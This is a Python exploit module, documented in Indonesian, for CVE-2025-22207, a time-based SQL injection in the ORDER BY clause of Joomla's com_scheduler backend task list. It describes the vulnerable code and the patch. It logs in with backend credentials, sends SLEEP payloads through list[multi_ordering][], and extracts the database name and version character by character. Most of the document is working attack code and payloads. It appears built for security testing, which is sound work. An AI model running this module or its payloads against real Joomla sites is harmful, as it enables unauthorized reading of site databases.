#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2025-22207 — SQL injection lewat order clause di daftar tugas backend com_scheduler.
Affected : Joomla! 4.1.0-4.4.10 dan 5.0.0-5.2.3   |   Patched: 4.4.11 / 5.2.4
NVD      : CVSS 4.0 6.7 / AV:N/AC:L/AT:N/PR:H/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N · CWE-89
Finder   : Calum Hutton (snyk.io) · Advisory Joomla [20250201] (halaman 958)

SUMBER (diff rilis resmi 5.2.3 -> 5.2.4):
  administrator/components/com_scheduler/src/Model/TasksModel.php
    + protected $listForbiddenList = ['select', 'multi_ordering'];   // <- inti: tak di-merge dari request
    populateState(): whitelist kolom (filter_fields) + whitelist arah (asc/desc) untuk tiap klausa
    getListQuery():  - $query->order($multiOrdering);                // komentar asli: "@todo Should add quoting here"
                     + foreach (...) { $orderClauses[] = $db->quoteName($column) . ' ' . $direction; }

MEKANISME:
  Daftar tugas backend menerima pengurutan multi-kolom dari request:
        index.php?option=com_scheduler&view=tasks&list[multi_ordering][]=<klausa>
  `ListModel::populateState()` (5.2.3) menyalin array itu ke state model tanpa sanitasi (hanya kunci
  'select' yang terlarang), lalu TasksModel::getListQuery():
        $multiOrdering = $this->state->get('list.multi_ordering');
        ...
        } else {
            // @todo Should add quoting here
            $query->order($multiOrdering);      // <- SINK: fragmen mentah
        }
  `Query::order()` (libraries/vendor/joomla/database/src/DatabaseQuery.php:1426) tidak memvalidasi apa pun,
  jadi elemen array dengan koma/kurung/tanda kutip masuk ke ORDER BY apa adanya.

BATAS VERSI (grep kode nyata pada paket rilis):
  5.2.3  -> baris `$query->order($multiOrdering)` ADA                    -> RENTAN
  5.2.4  -> tidak ada (validasi + quoteName)                             -> patched
  5.4.5 / 5.4.10 / 6.0.3 / 6.1.3 -> tidak ada                            -> patched
  (4.4.10/4.4.11 belum diperiksa kode di sini; modul memakai rentang CNA.)

BUKTI LAB (2026-11-09) — dua docroot dalam satu container/DB (mp-j603, DB j523 klon joomla545):
  j523 = Joomla 5.2.3 (rentan) · j524 = Joomla 5.2.4 (patched) · login backend `admin` (Super User)
  | request (view=tasks)                                  | 5.2.3              | 5.2.4        |
  | baseline                                              | 200 · 0.13s        | 200 · 0.10s  |
  | list[multi_ordering][]=a.note,(SELECT 1 FROM(SELECT SLEEP(2))x) | **200 · 2.06s** | 200 · 0.055s |
  | list[multi_ordering][]=a.note))-- -                   | **500**            | 200          |
  Catatan perilaku: pada 5.2.3 nilai rusak TERSIMPAN di user state (sesi) sehingga request berikutnya
  tetap 500 — modul mengembalikan state ke pengurutan default setelah pembuktian.

AKTOR (jujur): butuh sesi backend dengan akses com_scheduler (PR:H) — bukan serangan unauthenticated.
Dampak: pembacaan data DB (VC:H) lewat oracle waktu; tidak ada jalur tulis.
"""

import random
import re
import time

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, register, ver_lt)

MANIFEST = "/administrator/manifests/files/joomla.xml"
TASKS = "/administrator/index.php?option=com_scheduler&view=tasks"

RANGE_4 = ((4, 1, 0), (4, 4, 11))
RANGE_5 = ((5, 0, 0), (5, 2, 4))

SLEEP = 2
THRESH_F = 0.6
EXTRACT_LEN = 8
EXPRS = (("database()", "database()"), ("version()", "version()"))
RESET = "a.next_execution ASC"      # pengurutan default untuk mengembalikan state sesi


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", str(s)).split(".") if x != "")
    except Exception:  # noqa: BLE001
        return ()


def _vulnerable(ver):
    """4.1.0-4.4.10 dan 5.0.0-5.2.3 -> rentan (fix 4.4.11 / 5.2.4)."""
    if not ver:
        return None
    for lo, hi in (RANGE_4, RANGE_5):
        if not ver_lt(ver, lo) and ver_lt(ver, hi):
            return True
    return False


def _version(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200:
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
        if m:
            return _ver_tuple(m.group(1)), m.group(1)
    return None, ""


def _tok(text):
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', text or "")
    return m.group(1) if m else None


def _login(t, h, opts, timeout=25):
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    if not (u and p):
        return None, "butuh --username/--password akun backend dengan akses com_scheduler"
    base = t.url
    r = h.get(base + "/administrator/index.php", timeout=timeout, allow_redirects=True)
    if r is None:
        return None, "tidak dapat membuka halaman login administrator"
    # Sesi bisa saja sudah terautentikasi (dipakai ulang oleh pemanggil antar-fase).
    if re.search(r"logout|com_cpanel", r.text or "", re.I):
        return h, "ok (sesi sudah login)"
    tok = _tok(r.text)
    if not tok:
        return None, f"token login tidak ditemukan (http={r.status_code}) — bukan Joomla backend?"
    r2 = h.post(base + "/administrator/index.php",
                data={"username": u, "passwd": p, "option": "com_login", "task": "login",
                      "return": "aW5kZXgucGhw", tok: "1"},
                timeout=timeout, allow_redirects=True)
    if r2 is None or not re.search(r"logout|com_cpanel", r2.text or "", re.I):
        return None, f"login gagal (http={r2.status_code if r2 is not None else '-'})"
    return h, "ok"


def _tasks(t, h, clauses=None, timeout=60):
    """GET daftar tugas dengan (opsional) multi_ordering kustom -> (status, elapsed, resp)."""
    params = ""
    if clauses:
        for c in clauses:
            params += "&list%5Bmulti_ordering%5D%5B%5D=" + _enc(c)
    try:
        t0 = time.time()
        r = h.get(t.url + TASKS + params, timeout=timeout, allow_redirects=False)
        return r.status_code, time.time() - t0, r
    except Exception:  # noqa: BLE001
        return None, None, None


def _enc(s):
    from urllib.parse import quote
    return quote(s, safe="")


def _payload(expr, sleep=SLEEP):
    return f"a.note,(SELECT 1 FROM(SELECT IF({expr},SLEEP({sleep}),0))x)"


def _is_true(t, h, expr, base, sleep=SLEEP):
    _, el, _ = _tasks(t, h, [_payload(expr, sleep)])
    if el is None or base is None:
        return None
    return el >= base + max(0.4, THRESH_F * sleep)


def _reset_state(t, h):
    """Kembalikan pengurutan default (jejak minimal; menghindari sesi yang tertinggal rusak)."""
    try:
        _tasks(t, h, [RESET], timeout=20)
    except Exception:  # noqa: BLE001
        pass


def _extract(t, h, expr, pos, base, lo=32, hi=126):
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"(SELECT ASCII(SUBSTRING((SELECT {expr}),{pos},1)))>{mid}"
        res = _is_true(t, h, cond, base, sleep=1)
        if res is None:
            return None
        if res:
            lo = mid + 1
        else:
            hi = mid
    return lo if 32 <= lo <= 126 else None


def check(t, h, opts):
    """NON-DESTRUKTIF: bandingkan waktu respons tanpa vs dengan klausa SLEEP (sesi backend)."""
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, raw = _version(t, h)
    detail = f"joomla={raw or '?'}"
    vul = _vulnerable(ver)
    if vul is False:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 4.4.11 / 5.2.4)", detail
    if not (_opt(opts, "username") and _opt(opts, "password")):
        return (ST_INFO if vul else ST_UNKNOWN,
                "Joomla dalam rentang rentan; butuh --username/--password akun backend "
                "dengan akses com_scheduler untuk membuktikan injeksi",
                detail + " requires=session-backend")

    sess, msg = _login(t, h, opts)
    if sess is None:
        return ST_INFO, f"Joomla {raw or '?'} — {msg}", detail
    st_code, base, _ = _tasks(t, h, None)
    if st_code is None:
        return ST_UNKNOWN, f"Joomla {raw or '?'} — daftar tugas tidak merespons", detail
    if st_code in (401, 403, 302):
        return (ST_INFO,
                f"Joomla {raw or '?'} — akun tidak dapat membuka daftar tugas com_scheduler "
                f"(http={st_code}); butuh hak core.manage kom_scheduler",
                detail + f" | http={st_code}")
    _, t_true, _ = _tasks(t, h, [_payload("1=1")])
    _, t_false, _ = _tasks(t, h, [_payload("1=0")])
    _, t_err, r_err = _tasks(t, h, ["a.note))-- -"])
    _reset_state(t, h)
    ev = (f"baseline={base:.2f}s true={None if t_true is None else round(t_true, 2)}s "
          f"false={None if t_false is None else round(t_false, 2)}s "
          f"error={None if t_err is None else round(t_err, 2)}s/"
          f"{None if r_err is None else r_err.status_code} | {detail}")
    thresh = max(0.4, THRESH_F * SLEEP)
    if t_true is not None and t_true >= base + thresh and (t_false is None or t_false < base + thresh):
        return (ST_VULN,
                f"Joomla {raw or '?'} — klausa order com_scheduler injectable lewat "
                f"list[multi_ordering][] (delay {t_true - base:.2f}s pada kondisi benar)", ev)
    if r_err is not None and r_err.status_code >= 500:
        return (ST_VULN,
                f"Joomla {raw or '?'} — fragmen ORDER BY masuk ke query (error {r_err.status_code})",
                ev)
    return (ST_CLEAN if vul is False else ST_INFO,
            f"Joomla {raw or '?'} — tidak ada sinyal injeksi pada list[multi_ordering]", ev)


def exploit(t, h, opts):
    """
    Outcome terkontrol: pembacaan data dari database lewat injeksi order clause —
    ekstraksi `database()` dan `version()` secara boolean/time-based (read-only).
    """
    ver, raw = _version(t, h)
    if ver and _vulnerable(ver) is False:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 4.4.11 / 5.2.4)", f"joomla={raw}"
    sess, msg = _login(t, h, opts)
    if sess is None:
        return ST_INFO, msg, f"joomla={raw or '?'}"
    _, base, _ = _tasks(t, h, None)
    if base is None:
        return ST_UNKNOWN, f"Joomla {raw or '?'} — daftar tugas tidak merespons", ""
    _, t_true, _ = _tasks(t, h, [_payload("1=1")])
    if t_true is None or t_true < base + max(0.4, THRESH_F * SLEEP):
        _reset_state(t, h)
        return (ST_CLEAN,
                f"Joomla {raw or '?'} — tidak ada delay pada kondisi benar (sudah dipatch atau "
                f"list[multi_ordering] diabaikan)",
                f"baseline={base:.2f}s true={t_true}s | joomla={raw or '?'}")

    nlen = int(_opt(opts, "field_id") or 0) or EXTRACT_LEN
    got = {}
    for label, expr in EXPRS:
        chars = []
        for pos in range(1, nlen + 1):
            c = _extract(t, h, expr, pos, base)
            if c is None:
                break
            chars.append(chr(c))
            if c == 32:
                chars.pop()
                break
        got[label] = "".join(chars)
    _reset_state(t, h)

    ev = (f"joomla={raw or '?'} | baseline={base:.2f}s | injeksi multi_ordering terbukti | "
          + " ".join(f"{k}={v!r}" for k, v in got.items()))
    if got.get("database()") or got.get("version()"):
        return (ST_PWN,
                "SQL injection order clause (com_scheduler) terkonfirmasi — data dibaca dari "
                "database: " + ", ".join(f"{k}={v!r}" for k, v in got.items() if v), ev)
    return (ST_VULN, "injeksi terbukti (delay terukur) tetapi ekstraksi tidak konklusif", ev)


register(CveModule(
    cve="CVE-2025-22207",
    cluster="joomla_core",
    title="Joomla Core - SQL injection lewat order clause di daftar tugas backend com_scheduler "
          "(list[multi_ordering][])",
    vclass="sql injection",
    cvss="6.7",
    severity="medium",
    cwe="CWE-89",
    product="Joomla! Core (administrator/components/com_scheduler/src/Model/TasksModel.php)",
    versions_affected="4.1.0-4.4.10; 5.0.0-5.2.3",
    status="verified",
    requires=[
        "sesi backend dengan akses com_scheduler (--username/--password) — PR:H, bukan unauth",
        "daftar tugas com_scheduler dapat dibuka akun tersebut (kalau 302/403 modul berhenti "
        "dengan INFO)",
        "--field-id dipakai sebagai jumlah karakter yang diekstrak (default 8)",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink 5.2.3: TasksModel::getListQuery() memakai $this->state->get('list.multi_ordering') "
        "langsung ke $query->order() dengan komentar asli '@todo Should add quoting here'; state itu "
        "diisi dari request list[multi_ordering][] oleh ListModel::populateState() tanpa sanitasi "
        "(hanya 'select' yang terlarang di 5.2.3). Fix 5.2.4: TasksModel::listForbiddenList = "
        "['select','multi_ordering'] (tidak di-merge dari request) + whitelist kolom terhadap "
        "filter_fields dan arah asc/desc + quoteName() saat membangun klausa. Batas versi diverifikasi "
        "grep kode: baris rentan hanya ada di 5.2.3 (hilang di 5.2.4/5.4.x/6.x). Bukti lab 2026-11-09: "
        "dua docroot di satu container/DB — j523 (5.2.3) SLEEP(2) 2.06s & fragmen rusak 500; j524 (5.2.4) "
        "semua ~0.05s/200. Perilaku penting: pada versi rentan nilai rusak tersimpan di user state sehingga "
        "permintaan berikutnya ikut 500 — modul mengembalikan state ke 'a.next_execution ASC' setelah "
        "pembuktian. Dampak: baca DB (VC:H), tanpa jalur tulis."
    ),
))
